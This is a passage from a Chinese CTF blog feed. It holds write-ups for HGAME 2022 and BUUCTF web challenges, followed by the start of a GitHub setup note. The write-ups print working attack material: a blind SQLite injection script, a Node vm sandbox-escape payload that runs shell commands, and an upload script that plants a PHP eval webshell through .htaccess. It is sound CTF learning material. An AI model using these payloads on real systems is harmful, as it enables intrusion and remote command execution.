alt="image-20220204190428652"></p><p>猜测是twig的模板注入</p><p>参考链接</p><p><a href="https://whoamianony.top/2021/08/22/Web%E5%AE%89%E5%85%A8/Twig%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">https://whoamianony.top/2021/08/22/Web%E5%AE%89%E5%85%A8/Twig%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204190615656.png" alt="image-20220204190615656"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204190633423.png" alt="image-20220204190633423"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204190655380.png" alt="image-20220204190655380"></p><p>cat应该是被过滤了，可以用tac看一下</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204190732690.png" alt="image-20220204190732690"></p><p>把含有hgame内容的字符串也过滤了，尝试逆向输出</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204190810214.png" alt="image-20220204190810214"></p><p>成功，拿到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204190827635.png" alt="image-20220204190827635"></p><h3 id="Vidar-shop-demo"><a href="#Vidar-shop-demo" class="headerlink" title="Vidar shop demo"></a>Vidar shop demo</h3><p>看这个描述就像条件竞争</p><p>先随便注册个账户进入</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204180704485.png" alt="image-20220204180704485"></p><p>看看商店，flag要一万，我们只有九千九百九十九</p><p>先买个徽章试试</p><p>发现购买的徽章如果删除，购买花费的钱也会返还，所以试试再开一个网页，同时删除徽章</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204180850691.png" alt="image-20220204180850691"></p><p>成功大于一万了，买个flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204180917539.png" alt="image-20220204180917539"></p><h3 id="LoginMe"><a href="#LoginMe" class="headerlink" title="LoginMe*"></a>LoginMe*</h3><p>sql注入，给的hint很明显就是sql语句</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220212223934416.png" alt="image-20220212223934416"></p><p>但是因为平常的题都是mysql的，这个是 sqlite，所以只试出了注入点，其他的就没注</p><p>sqlite因为其比较简易每个db文件就是一个数据库，所以不存在information_schema数据库，但存在类似作用的表sqlite_master。</p><p>该表记录了该库下的所有表，索引，表的创建sql等所以我们可以通过此读取数据，常见语句如下。</p><pre class="language-none"><code class="language-none">1 读取表名：select group_concat(name) from sqlite_master where type&#x3D;&#39;table&#39;2 读取字段：select group_concat(sql) from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;表名&#39;</code></pre><p>看看表名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220212232736925.png" alt="image-20220212232736925"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220212232755661.png" alt="image-20220212232755661"></p><p>证明确实能注，可以写个脚本</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220212233244464.png" alt="image-20220212233244464"></p><p>反正最后表名是uuussseeerrrsss</p><p>后边的脚本（手注太慢了</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;d51f66203d.login.summ3r.top:60067&#x2F;login&quot;date &#x3D; &#123;&quot;username&quot;:&quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;,&quot;password&quot;:&quot;test&quot;&#125;flag &#x3D; &#39;&#39;for i in range(1,200):    for j in range(31,127):        #列名        #date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j))        #读数据        date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select group_concat(password) from uuussseeerrrsss),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j))        r &#x3D; requests.post(url,json&#x3D;date);        response &#x3D; r.text        if &#39;success&#39; in response:            flag +&#x3D;chr(j)            print(flag)            breakprint(flag)</code></pre><p>拿到密码之后登录就行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220213003003539.png" alt="image-20220213003003539"></p><p>也可以用sqlmap直接跑</p><p>bp抓包之后保存到本地</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220213004158890.png" alt="image-20220213004158890"></p><p>然后上sqlmap</p><p>python sqlmap.py -r &quot;D:\Desktop\post.txt&quot; --dump --batch --threads 10 --no-cast --flush-session</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220213004815203.png" alt="image-20220213004815203"></p><h1 id="第四周wp"><a href="#第四周wp" class="headerlink" title="第四周wp"></a>第四周wp</h1><h2 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB"></a>WEB</h2><h3 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h3><p>又是go语言的题</p><p>很明显flag在there may be a flag里但是没法访问到</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220214215644843.png" alt="image-20220214215644843"></p><p>因为根据main.go里的内容可以看到这个路由被出题人加上了web服务,从而使得我们没法通过直接访问<code>/there may be a flag</code>来获取文件。而是得到<code>/there may be a flag</code>路由的回显。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220214215629146.png" alt="image-20220214215629146"></p><p>谷歌找一下ctf里出现过的go语言漏洞</p><p><a href="https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220214215905860.png" alt="image-20220214215905860"></p><p>利用相对路径访问</p><p>对于 CONNECT 请求，路径和主机保持不变。</p><p>和这道题的考点一模一样，可以仿照其payload仿写一个</p><pre class="language-none"><code class="language-none">curl --path-as-is -X CONNECT http:&#x2F;&#x2F;6a87cb1c66.filesystem.hgame.homeboyc.cn&#x2F;main.go&#x2F;..&#x2F;there_may_be_a_flag</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220214215820089.png" alt="image-20220214215820089"></p><h3 id="Comment"><a href="#Comment" class="headerlink" title="Comment*"></a>Comment*</h3><p>考点：xxe注入</p><p>源码：</p><pre class="language-none"><code class="language-none">&lt;?phprequire &#39;.&#x2F;init.php&#39;;require_once &#39;.&#x2F;db.php&#39;;libxml_disable_entity_loader(false);function waf($str): bool &#123;    if (preg_match(&#39;&#x2F;file|glob|http|dict|gopher|php|ftp|ssh|phar&#x2F;i&#39;, $str)) &#123;        return true;    &#125;    return false;&#125;function save() &#123;    if ($_SERVER[&#39;REQUEST_METHOD&#39;] !&#x3D; &#39;POST&#39;) &#123;        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;wrong method&#39;]);        return;    &#125;    $data &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);    if (waf($data)) &#123;        http_response_code(403);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]);        return;    &#125;    $id &#x3D; $_SESSION[&#39;unique_id&#39;];    $db &#x3D; getDB();    $stmt &#x3D; $db-&gt;prepare(&#39;INSERT INTO comments (sender,content) VALUES (?,?)&#39;);    $stmt-&gt;execute([$id, $data]);    if ($stmt-&gt;rowCount() !&#x3D; 0) &#123;        echo json_encode([&#39;msg&#39; &#x3D;&gt; &#39;success&#39;]);    &#125; else &#123;        http_response_code(500);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;failed to create records&#39;]);    &#125;&#125;function parseXML($str) &#123;    $dom &#x3D; new DOMDocument();    try &#123;        $dom-&gt;loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD);    &#125; catch (Exception $e) &#123;        http_response_code(400);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;invalid xml data&#39;]);        die();    &#125;    $attrs &#x3D; simplexml_import_dom($dom);    if (!isset($attrs-&gt;content)) &#123;        http_response_code(400);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;content is empty&#39;]);        die();    &#125;    if (waf($attrs-&gt;sender) || waf($attrs-&gt;content)) &#123;        http_response_code(403);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]);        die();    &#125;    if ($attrs-&gt;sender &#x3D;&#x3D; &#39;admin&#39; &amp;&amp; !preg_match(&#39;&#x2F;admin&#x2F;i&#39;, $str)) &#123;        $flag &#x3D; &#39;hgame&#123;xxxxx&#125;&#39;;        $attrs-&gt;content &#x3D; $flag;    &#125;    return $attrs;&#125;function get() &#123;    $id &#x3D; $_SESSION[&#39;unique_id&#39;];    $db &#x3D; getDB();    $stmt &#x3D; $db-&gt;prepare(&#39;SELECT * FROM comments WHERE sender&#x3D;?&#39;);    $stmt-&gt;execute([$id]);    $data &#x3D; $stmt-&gt;fetchAll();    $result &#x3D; [];    foreach ($data as $key &#x3D;&gt; $val) &#123;        array_push($result, parseXML($val[&#39;content&#39;]));    &#125;    echo json_encode($result);&#125;switch ($_GET[&#39;action&#39;]) &#123;    case &#39;get&#39;:        get();        break;    case &#39;add&#39;:        save();        break;    case &#39;info&#39;:        echo json_encode([&#39;unique_id&#39; &#x3D;&gt; $_SESSION[&#39;unique_id&#39;]]);        break;    default:        http_response_code(400);        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;no such action&#39;]);        break;&#125;</code></pre><p>先抓个包看看</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220220230401250.png" alt="image-20220220230401250"></p><p>挺明显的xxe</p><p>然后就要满足获取flag的条件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220220230438960.png" alt="image-20220220230438960"></p><p>要求sender里有admin但是传入的内容不许有admin</p><p>可以尝试data协议</p><p>（比赛的时候不知道怎么想的一直想绕过waf读文件。。。忘了data协议</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220220234723611.png" alt="image-20220220234723611"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220220232831204.png" alt="image-20220220232831204"></p><h3 id="Markdown-Online"><a href="#Markdown-Online" class="headerlink" title="Markdown Online*"></a>Markdown Online*</h3><p>看一下源码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220221141602097.png" alt="image-20220221141602097"></p><p>toUpperCase()是将小写转换为大写，但是这样也绝不可能绕过54gk的这个if判断</p><p>利用了try catch但是catch并没有return语句，也就导致try中的代码抛出错误后继续往下执行</p><p>所以就要想办法让req.body.password = req.body.password.toUpperCase()报错</p><p>对 req.body.password.toUpperCase() 正确的解读方式是：获取 req.body.password对象的 toUpperCase属性，然后把这个属性当作函数来调用。如果这个属性不是函数对象就会抛出错误</p><p>所以可以用</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p>或</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string">"length"</span><span class="token operator">:</span> <span class="token number">16</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>都可以满足第一个if的length==16的判断并让toUpperCase()报错</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220221143354198.png" alt="image-20220221143354198"></p><p>然后我们访问/md</p><p>在这部分</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220221143602581.png" alt="image-20220221143602581"></p><p>利用markdownit库，并对html标签支持</p><p>在提交的地方</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220221144119817.png" alt="image-20220221144119817"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220221144044221.png"></p><p>在 SubmitController 里，markdown-it 解析出来的 html 代码会被 zombie.js 加载，zobmie.js 在遇到 JavaScript 代码的时候会将其交给 vm 虚拟机执行</p><p>而vm模块是存在逃逸的， JavaScript 对象的继承是靠原型链实现的，借助原型链可访问到 vm 沙箱以外的内容，实现 RCE</p><p>百度找个vm逃逸的payload</p><pre class="language-none"><code class="language-none">this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;)</code></pre><p>然后还要绕过waf</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220221144435975.png" alt="image-20220221144435975"></p><p>利用 JavaScript 的语言特性， obj.contructor 可以变为 obj[&quot;contr&quot;+&quot;uctor&quot;] 的形式， + 也被 ban 了，可以用concat拼接字符串的形式: obj[&quot;constru&quot;.concat(&quot;ctor&quot;)] this 和 process 可以用 eval(&quot;th&quot;+&quot;is&quot;) 的形式绕过。</p><p>这里eval和String.fromCharCode都没被过滤，可以用这个绕过</p><pre class="language-python" data-language="python"><code class="language-python">a &#x3D; &quot;document.write(this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;ls &#x2F;&#39;))&quot;b &#x3D; []for i in range(len(a)):    b.append(ord(a[i]))print(b)</code></pre><pre class="language-none"><code class="language-none">&lt;script&gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 116, 104, 105, 115, 46, 95, 95, 112, 114, 111, 116, 111, 95, 95, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 40, 39, 114, 101, 116, 117, 114, 110, 32, 112, 114, 111, 99, 101, 115, 115, 39, 41, 40, 41, 46, 109, 97, 105, 110, 77, 111, 100, 117, 108, 101, 46, 114, 101, 113, 117, 105, 114, 101, 40, 39, 99, 104, 105, 108, 100, 95, 112, 114, 111, 99, 101, 115, 115, 39, 41, 46, 101, 120, 101, 99, 83, 121, 110, 99, 40, 39, 108, 115, 32, 47, 39, 41, 41))&lt;&#x2F;script&gt;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220221150403606.png" alt="image-20220221150403606"></p><p>然后cat /flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220221150727819.png" alt="image-20220221150727819"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题记录(二)</title>
      <link href="/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/"/>
      <url>/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpfunction get_the_flag()&#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh &#x3D; @$_GET[&#39;_&#39;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#39;One inch long, one inch strong!&#39;);&#125;if ( preg_match(&#39;&#x2F;[\x00- 0-9A-Za-z\&#39;&quot;\&#96;~_&amp;.,|&#x3D;[\x7F]+&#x2F;i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type &#x3D; count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>前半段是关于文件上传的代码，后半段则是无数字字母rce，猜是要传一个一句话木马上去getshell</p><p>但是有个非预期解，利用eval函数查看phpinfo就能找到flag</p><pre class="language-none"><code class="language-none">_&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220119190933261.png" alt="image-20220119190933261"></p><p><strong>预期解：</strong></p><p>首先利用eval来执行get_the_flag函数</p><pre class="language-none"><code class="language-none">_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;;&amp;%ff&#x3D;get_the_flag</code></pre><p>再看get_the_flag这个函数</p><pre class="language-php" data-language="php"><code class="language-php">function get_the_flag()&#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];&#x2F;&#x2F; 表示的是上传临时文件的绝对路径        $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);&#x2F;&#x2F;得到后缀    if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;);&#x2F;&#x2F;禁止ph的文件后缀        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); &#x2F;&#x2F;图片判断        $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;</code></pre><p>对上传的文件内容进行了过滤，过滤了ph，&lt;?，同时还要求上传的文件文件头为图片类型</p><p>所以可以尝试上传htaccess格式或者user.ini格式的文件来解析图片马</p><p>.user.ini没用，可能是因为上传的文件夹内没有正常的php文件</p><p>偷了个脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport base64htaccess &#x3D; b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application&#x2F;x-httpd-php .sssphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;shell.sss&quot;&quot;&quot;&quot;shell &#x3D; b&quot;GIF89a11&quot; + base64.b64encode(b&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;)  #GIF89后的11是为了满足base64编码url &#x3D; &quot;http:&#x2F;&#x2F;5da5136e-0e89-4d3c-bac5-a2d4f561663b.node4.buuoj.cn:81&#x2F;?_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag&quot;files &#x3D; &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image&#x2F;jpeg&#39;)&#125;data &#x3D; &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)print(response.text)files &#x3D; &#123;&#39;file&#39;:(&#39;shell.sss&#39;,shell,&#39;image&#x2F;jpeg&#39;)&#125;response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)print(response.text)</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220119194212595.png" alt="image-20220119194212595"></p><p>得到路径之后蚁剑连一下</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220119194354577.png" alt="image-20220119194354577"></p><p>根目录下</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220119194520905.png" alt="image-20220119194520905"></p><p>？？为什么我能直接读，百度的wp都是还要绕过open_basedir的</p><p><a href="https://www.e-learn.cn/topic/3627394">浅谈几种Bypass open_basedir的方法 | 易学教程 (e-learn.cn)</a></p><p><a href="https://xz.aliyun.com/t/4720">bypass open_basedir的新方法 - 先知社区 (aliyun.com)</a></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120110108160.png" alt="image-20220120110108160"></p><p>抓包，把给的hash值利用get传进去</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120110154642.png" alt="image-20220120110154642"></p><p>看一下flflflflag.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120110245508.png" alt="image-20220120110245508"></p><p>利用伪协议读一下源码</p><p>file=php://filter/convert.base64-encode/resource=flflflflag.php</p><p>得到</p><pre class="language-none"><code class="language-none">&lt;html&gt;&lt;head&gt;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;           window.location.href&#x3D;&quot;404.html&quot;;&lt;&#x2F;script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file&#x3D;$_GET[&#39;file&#39;];if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &#39;config.php&#39;;@$name&#x3D;$_GET[&#39;name&#39;];@$pass&#x3D;$_GET[&#39;pass&#39;];if(md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass)&#123;echo &#39;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;           window.location.href&#x3D;&quot;flflflflag.php&quot;;&lt;&#x2F;script&gt;&#39;;&#125;else&#123;setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);echo &quot;username&#x2F;password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt;&lt;&#x2F;html&gt;</code></pre><p>config.php有个假flag。。。</p><p>这道题是要利用php临时文件来写马，找到phpinfo里的flag</p><p><a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">PHP临时文件机制与利用的思考 - linuxsec - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/11301743.html">关于php文件操作的几个小trick - tr1ple - 博客园 (cnblogs.com)</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120114000050.png" alt="image-20220120114000050"></p><p>临时文件的默认存储位置在tmp目录下，扫目录扫出的dir.php显示了tmp目录下的文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120115533341.png" alt="image-20220120115533341"></p><p>dir.php</p><pre class="language-none"><code class="language-none">&lt;?phpvar_dump(scandir(&#39;&#x2F;tmp&#39;));?&gt;</code></pre><p>利用python脚本上传文件</p><pre class="language-python" data-language="python"><code class="language-python">import requestsfrom io import BytesIOurl&#x3D;&quot;http:&#x2F;&#x2F;77fd686d-4b45-41a8-81f4-0a199419646a.node4.buuoj.cn:81&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&#x2F;&#x2F;使php崩溃，让上传的文件保留在tmp目录中payload&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot;files&#x3D;&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,allow_redirects&#x3D;False)&#x2F;&#x2F;防止重定向print(r.text)</code></pre><p>可以看到上传成功</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120122305671.png" alt="image-20220120122305671"></p><p>得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)//image-20220120122643975.png" alt="image-20220120122643975"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github使用</title>
      <link href="/2021/10/02/github%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/10/02/github%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>​    在学python的时候顺便学了些GitHub的使用，写个文档防止忘了</p> <span id="more"></span><p><strong>绑定用户</strong></p><p>打开git-bash</p><p>填写用户名和密码</p><p>提示（配置的帐号名和邮箱一定要与GitHub相同，不然会提交失败）</p><pre class="language-none"><code class="language-none">git config --global user.name &quot;@@@&quot;     (GitHub相对应的帐号名称)git config --global user.email &quot;123@163.com&quot;  （GitHbu相对应的邮箱帐号）</code></pre><p><strong>设置ssh key</strong></p><p>生成ssh key</p><p>首先检查是否已生成密钥 cd ~/.ssh，ls如果有3个文件，则密钥已经生成，id_rsa.pub就是公钥</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNDU0MTYwMjAtOTMyNTYwNjcxLnBuZw?x-oss-process=image/format,png" alt="img"></p><p> 如果没有，输入: ssh-keygen -t rsa -C &quot;你的邮箱&quot;</p><p>复制ssh key</p><p> 方法1: 输入 clip &lt; ~/.ssh/id_rsa.pub   会自动复制ssh key，可以直接粘贴</p><p> 方法2:在c/Users/Administrator/.ssh/id_rsa)文件找到直接复制</p><p><img 